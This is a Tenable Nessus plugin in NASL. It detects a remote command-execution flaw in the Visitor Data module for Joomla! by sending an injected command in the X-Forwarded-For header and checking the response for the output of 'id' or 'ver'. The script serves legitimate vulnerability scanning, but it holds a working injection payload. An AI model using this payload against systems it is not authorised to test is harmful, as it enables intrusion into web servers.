#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46332);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_bugtraq_id(40075);
  script_osvdb_id(64583);
  script_xref(name:"EDB-ID", value:"12574");

  script_name(english:"Visitor Data Module for Joomla! X-Forwarded-For Header RCE");
  script_summary(english:"Attempts to run a command.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote code execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of the Visitor Data module for Joomla! running on the
remote host is affected by a remote code execution vulnerability due
to improper sanitization of user-supplied input to the X-Forwarded-For
request header before passing it to the exec() function. An
unauthenticated, remote attacker can exploit this issue to disclose
arbitrary files or execute arbitrary PHP code on the remote host,
subject to the privileges of the web server user ID.");
  # http://elotrolad0.blogspot.com/2010/05/modvisitordata-joomla-remoce-code.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dbf42fff");
  script_set_attribute(attribute:"solution", value:
"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:U/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/05/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/05/13");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2017 Tenable Network Security, Inc.");

  script_dependencies("joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("installed_sw/Joomla!", "www/PHP");

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = "Joomla!";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);
dir = install['path'];
install_url =  build_url(port:port, qs:dir);

#     The technique used here only gives us access to the last line
#     of command output because of the way the PHP code is written.
#     It may be possible to get all the output by redirecting command
#     output to an open file descriptor, but that's likely requires
#     multiple requests and isn't necessarily portable.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ver';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ver');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ver'] = "Windows \[Version [0-9]";

# Try to exploit the issue to run a command.
foreach cmd (cmds)
{
  magic = substr(SCRIPT_NAME, 0, strlen(SCRIPT_NAME)-6) + '-' + unixtime();

  if ('ver' == cmd) exploit = magic + ' & ' + cmd + ' & rem ';
  else exploit = '--version ' + magic + '; (echo -n "netname  ";' + cmd + ');1';

  res = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : dir + '/index.php',
    add_headers  : make_array(
      "X-Forwarded-For", exploit
    ),
    exit_on_fail : TRUE
  );

  # Unless we're paranoid, make sure the affected module is installed.
  if (
    report_paranoia < 2 &&
    res[2] &&
    '<h3>Visitor Data</h3>' >!< res[2] &&
    '.gif" width="18" height="12"' >!< res[2]
  ) audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, "Visitor Data module");

  # There's a problem if we see the expected command output.
  if (egrep(pattern:cmd_pats[cmd], string:res[2]))
  {
    output = strstr(res[2], '<h3>Visitor Data</h3>');
    output = strstr(output, '.gif" width="18" height="12"');
    output = strstr(output, '" />  : ') - '" />  : ';
    output = output - strstr(output, '<br/><strong>');
    if(empty_or_null(output)) output = res[2];

    if ('ver' == cmd)
      rep_extra = 'Note that the first 9 characters of the output are filtered out by' + '\nthe script';
    else rep_extra = NULL;

    security_report_v4(
      port        : port,
      severity    : SECURITY_HOLE,
      cmd         : cmd,
      request     : make_list(http_last_sent_request()),
      output      : chomp(output),
      rep_extra   : rep_extra
    );
    exit(0);
  }
}
audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, "Visitor Data module");
